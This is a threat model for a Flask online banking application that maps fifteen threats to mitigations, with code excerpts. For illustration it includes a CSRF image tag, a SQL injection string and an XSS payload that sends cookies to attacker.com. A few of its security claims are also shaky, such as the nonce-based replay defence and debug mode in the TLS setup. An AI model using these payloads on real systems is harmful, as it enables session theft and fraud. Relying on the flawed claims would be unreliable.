# Threat Model - Secure Banking Application

## Executive Summary

This document outlines the threat model for the Secure Banking Application, identifying potential security threats, their impacts, and the cryptographic mitigations implemented to protect against them.

---

## 1. System Overview

**Application**: Secure Online Banking System  
**Primary Functions**:
- User authentication (login/logout)
- Account balance viewing
- Money transfers between accounts

**Trust Boundaries**:
- **Untrusted**: Internet, client browser, public WiFi networks
- **Trusted**: Application server, database

---

## 2. Threat Analysis Table

| Threat ID | Threat | Attack Vector | Impact | Likelihood | Severity | Mitigation | Implementation |
|-----------|--------|---------------|--------|------------|----------|------------|----------------|
| T-001 | **Man-in-the-Middle (MITM)** | Attacker intercepts network traffic between client and server | Credentials stolen, transactions modified | High (public WiFi) | **Critical** | TLS 1.3 encryption | `app.run(ssl_context=...)` |
| T-002 | **Eavesdropping** | Passive network sniffing to capture sensitive data | Password, account data exposed | High | **Critical** | TLS 1.3 with AES-256-GCM | TLS handshake with certificate validation |
| T-003 | **Credential Stuffing** | Automated login attempts with stolen credentials | Unauthorized access | Medium | **High** | Rate limiting (5 attempts/5min) | `app/security/sessions.py:check_rate_limit()` |
| T-004 | **Brute Force Attack** | Systematically trying passwords | Account compromise | Medium | **High** | Bcrypt (slow hashing), rate limiting | `app/security/passwords.py:hash_password()` |
| T-005 | **Session Hijacking** | Stealing session cookies via XSS or network | Account takeover | Medium | **Critical** | HttpOnly, Secure, SameSite cookies | `SESSION_COOKIE_HTTPONLY=True` |
| T-006 | **Session Fixation** | Forcing user to use attacker's session ID | Account impersonation | Low | **High** | Session regeneration on login | `sessions.py:create_session()` clears old session |
| T-007 | **CSRF (Cross-Site Request Forgery)** | Malicious site triggers unauthorized transfer | Unauthorized money transfer | Medium | **High** | CSRF token validation | `app/security/csrf.py:csrf_protect` decorator |
| T-008 | **Replay Attack** | Re-sending captured valid transfer request | Duplicate transactions | Low | **Medium** | Unique nonce per transaction | `transactions.nonce UNIQUE` constraint |
| T-009 | **SQL Injection** | Injecting SQL through input fields | Database compromise | Medium | **Critical** | Parameterized queries | All queries use `?` placeholders |
| T-010 | **XSS (Cross-Site Scripting)** | Injecting JavaScript to steal data | Session token theft | Low | **Medium** | Input sanitization, HttpOnly cookies | Flask auto-escapes templates, HttpOnly flag |
| T-011 | **Timing Attacks** | Measuring response time to guess passwords | Password enumeration | Low | **Low** | Constant-time comparison | `bcrypt.checkpw()` built-in protection |
| T-012 | **Password Cracking** | Offline hash cracking after database breach | Account compromise | Low | **High** | Bcrypt with high work factor | Cost factor 12 (2^12 iterations) |
| T-013 | **Rainbow Table Attack** | Pre-computed hash lookup | Password recovery | Low | **Medium** | Unique salt per password | Bcrypt auto-generates unique salt |
| T-014 | **Session Timeout Bypass** | Using stale session after logout | Unauthorized access | Low | **Medium** | Idle and absolute timeouts | 30min idle, 8hr absolute limit |
| T-015 | **Certificate Spoofing** | Fake TLS certificate to impersonate server | MITM attack success | Low | **Critical** | Certificate validation | Browser validates cert chain |

---

## 3. Detailed Threat Analysis

### T-001: Man-in-the-Middle (MITM) Attack

**Description**: An attacker positions themselves between the client and server to intercept or modify communications.

**Attack Scenario**:
1. User connects to banking app over public WiFi
2. Attacker performs ARP spoofing to intercept traffic
3. Without encryption, attacker can see username/password
4. Attacker can also modify transfer amounts

**Mitigation**: 
- **TLS 1.3 Encryption**: All communication encrypted with AES-256-GCM
- **Certificate Validation**: Client verifies server's TLS certificate
- **Perfect Forward Secrecy**: Ephemeral Diffie-Hellman key exchange

**Code Reference**:
```python
# app/main.py
app.run(
    host='0.0.0.0',
    port=5000,
    ssl_context=('cert.pem', 'key.pem'),  # TLS enabled
    debug=True
)
```

**Verification**:
- Run: `openssl s_client -connect localhost:5000 -tls1_3`
- Confirm: `Protocol: TLSv1.3` in output
- Browser: Check padlock icon shows TLS 1.3

---

### T-002: Eavesdropping

**Description**: Passive interception of network traffic to extract sensitive information.

**Attack Scenario**:
1. Attacker runs Wireshark on same network
2. Captures all packets between client and server
3. Without encryption, login credentials visible in plaintext

**Mitigation**:
- **TLS 1.3**: All application data encrypted
- **HTTPS Enforcement**: All routes require HTTPS

**Crypto Details**:
- Cipher: AES-256-GCM (authenticated encryption)
- Key Exchange: ECDHE (ephemeral keys)
- MAC: Built into GCM mode

**Verification**:
- Wireshark capture shows "Application Data" (encrypted)
- No plaintext credentials visible in packet capture

---

### T-003 & T-004: Credential Stuffing / Brute Force

**Description**: Automated attempts to guess passwords or use leaked credentials.

**Attack Scenario**:
1. Attacker obtains list of leaked passwords from data breach
2. Scripts automated login attempts
3. Without rate limiting, could try millions per hour

**Mitigation**:
- **Rate Limiting**: Maximum 5 attempts per 5 minutes per username
- **Bcrypt**: Makes each password check slow (~100ms)
- **Account Lockout**: 5-minute cooldown after max attempts

**Code Reference**:
```python
# app/security/sessions.py
MAX_LOGIN_ATTEMPTS = 5
LOCKOUT_DURATION_SECONDS = 300  # 5 minutes

def check_rate_limit(username: str) -> tuple[bool, str]:
    # ... implementation ...
    if attempts >= MAX_LOGIN_ATTEMPTS:
        return False, "Too many login attempts..."
```

**Mathematical Impact**:
- Without rate limiting: 1,000,000 attempts/second (theoretical)
- With rate limiting: 5 attempts/300 seconds = 0.017 attempts/second
- **Slowdown: ~60,000,000x**

---

### T-005 & T-006: Session Hijacking / Fixation

**Description**: Stealing or forcing session identifiers to impersonate users.

**Attack Scenario (Hijacking)**:
1. Attacker uses XSS to steal session cookie
2. Attacker uses stolen cookie to access victim's account

**Attack Scenario (Fixation)**:
1. Attacker sets victim's session ID before login
2. Victim logs in (session ID unchanged)
3. Attacker uses known session ID to access account

**Mitigation**:
```python
# app/main.py - Session configuration
app.config.update(
    SESSION_COOKIE_SECURE=True,      # Only over HTTPS
    SESSION_COOKIE_HTTPONLY=True,    # No JavaScript access (XSS protection)
    SESSION_COOKIE_SAMESITE='Lax',   # CSRF protection
    PERMANENT_SESSION_LIFETIME=timedelta(minutes=30)
)

# app/security/sessions.py - Session regeneration
def create_session(user_id, username):
    session.clear()  # Clears any existing session (prevents fixation)
    session['user_id'] = user_id
    # ... 
```

**Security Flags**:
- **Secure**: Cookie only sent over HTTPS (prevents network sniffing)
- **HttpOnly**: JavaScript cannot access cookie (prevents XSS theft)
- **SameSite=Lax**: Prevents CSRF (cookie not sent on cross-site requests)

---

### T-007: Cross-Site Request Forgery (CSRF)

**Description**: Malicious website tricks user's browser into making unauthorized requests.

**Attack Scenario**:
1. User logs into banking app (session active)
2. User visits malicious site: `evil.com`
3. Malicious site contains: `<img src="https://bank.com/transfer?to=attacker&amount=1000">`
4. Browser automatically includes session cookie
5. Without CSRF protection, transfer executes

**Mitigation**:
```python
# app/security/csrf.py
def generate_csrf_token() -> str:
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)  # 256 bits
    return session['csrf_token']

@csrf_protect  # Decorator validates token
def process_transfer():
    # Transfer only proceeds if token matches
```

**How It Works**:
1. Server generates random 256-bit token, stores in session
2. Token embedded in form as hidden field
3. On submit, server compares submitted token with session token
4. Malicious site cannot access session token (different origin)
5. Request fails if tokens don't match

**Entropy**: 2^256 possible tokens = impossible to guess

---

### T-008: Replay Attack

**Description**: Capturing and re-sending a valid request to execute it multiple times.

**Attack Scenario**:
1. Attacker intercepts valid transfer request (even if encrypted, can capture packet)
2. Attacker replays request 100 times
3. Without nonce, each replay would transfer money

**Mitigation**:
```python
# app/routes/transfer.py
nonce = secrets.token_hex(16)  # 128-bit unique nonce

cursor.execute('''
    INSERT INTO transactions 
    (from_account, to_account, amount, nonce, csrf_token)
    VALUES (?, ?, ?, ?, ?)
''', (from_account, to_account, amount, nonce, csrf_token))

# Database schema - UNIQUE constraint
# nonce TEXT UNIQUE NOT NULL
```

**How It Works**:
1. Each transaction gets cryptographically random 128-bit nonce
2. Nonce stored in database with UNIQUE constraint
3. Replay attempt violates constraint → `IntegrityError`
4. Transaction rolled back, error returned to attacker

**Security**: 2^128 possible nonces = no collisions in practice

---

### T-009: SQL Injection

**Description**: Injecting SQL code through user inputs to manipulate database.

**Attack Scenario**:
```python
# VULNERABLE CODE (not in our app):
query = f"SELECT * FROM users WHERE username = '{username}'"
# Attacker inputs: username = "' OR '1'='1"
# Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'
# Returns all users!
```

**Mitigation**:
```python
# SECURE CODE (used in our app):
cursor.execute(
    "SELECT * FROM users WHERE username = ?",
    (username,)  # Parameterized query
)
```

**All queries in application use parameterized queries** with `?` placeholders.
SQLite driver automatically escapes parameters, preventing injection.

---

### T-010: Cross-Site Scripting (XSS)

**Description**: Injecting malicious JavaScript into pages viewed by other users.

**Attack Scenario**:
```javascript
// Attacker enters as transfer description:
description = "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"

// Without sanitization, script executes when admin views transactions
```

**Mitigation**:
1. **Flask auto-escapes all template variables**
2. **HttpOnly cookies**: Even if XSS exists, JavaScript cannot access session cookie
3. **Input validation**: Reject suspicious inputs

---

## 4. Risk Matrix

| Severity | Likelihood High | Likelihood Medium | Likelihood Low |
|----------|----------------|-------------------|----------------|
| **Critical** | T-001 (MITM) - **TLS 1.3** | T-009 (SQLi) - **Parameterized queries** | T-015 (Cert spoof) - **Validation** |
| **High** | | T-003 (Credential stuffing) - **Rate limit** | T-004 (Brute force) - **Bcrypt** |
| **Medium** | | T-007 (CSRF) - **CSRF tokens** | T-008 (Replay) - **Nonce** |

---

## 5. Mitigation Summary

| Security Control | Threats Mitigated | Implementation |
|------------------|-------------------|----------------|
| **TLS 1.3** | T-001, T-002, T-005 | `ssl_context=('cert.pem', 'key.pem')` |
| **Bcrypt** | T-004, T-012, T-013 | `app/security/passwords.py` |
| **Rate Limiting** | T-003, T-004 | `app/security/sessions.py:check_rate_limit()` |
| **Session Security** | T-005, T-006, T-014 | `HttpOnly`, `Secure`, `SameSite`, timeout |
| **CSRF Tokens** | T-007 | `app/security/csrf.py` |
| **Nonce** | T-008 | `transactions.nonce UNIQUE` |
| **Parameterized Queries** | T-009 | All DB queries use `?` placeholders |

---

## 6. Residual Risks

Even with all mitigations, some risks remain:

1. **Phishing**: User could be tricked into entering credentials on fake site
   - *Additional mitigation*: User education, 2FA
   
2. **Malware on Client**: Keylogger could capture password
   - *Additional mitigation*: Multi-factor authentication
   
3. **Database Breach**: If database stolen, hashes could be cracked (slowly)
   - *Additional mitigation*: Encryption at rest, database access controls
   
4. **Insider Threat**: Malicious admin could access data
   - *Additional mitigation*: Audit logging, separation of duties

---

## 7. Compliance Mapping

| Standard | Requirement | Implementation |
|----------|-------------|----------------|
| **OWASP Top 10 2021** | A02: Cryptographic Failures | TLS 1.3, Bcrypt |
| **OWASP Top 10 2021** | A03: Injection | Parameterized queries |
| **OWASP Top 10 2021** | A07: Identification/Auth | Rate limiting, strong passwords |
| **NIST SP 800-63B** | Password Hashing | Bcrypt (approved algorithm) |
| **NIST SP 800-52 Rev 2** | TLS Configuration | TLS 1.3, strong ciphers |
| **PCI DSS 4.0** | Requirement 4 | Strong cryptography (TLS 1.3) |
| **PCI DSS 4.0** | Requirement 8 | Multi-factor considerations (MFA design) |

---

## 8. References

- **OWASP**: https://owasp.org/www-project-top-ten/
- **NIST SP 800-52**: TLS Configuration Guidelines
- **NIST SP 800-63B**: Digital Identity Guidelines
- **RFC 8446**: The Transport Layer Security (TLS) Protocol Version 1.3
- **RFC 6238**: TOTP: Time-Based One-Time Password Algorithm

---

*This threat model should be reviewed and updated quarterly or after significant system changes.*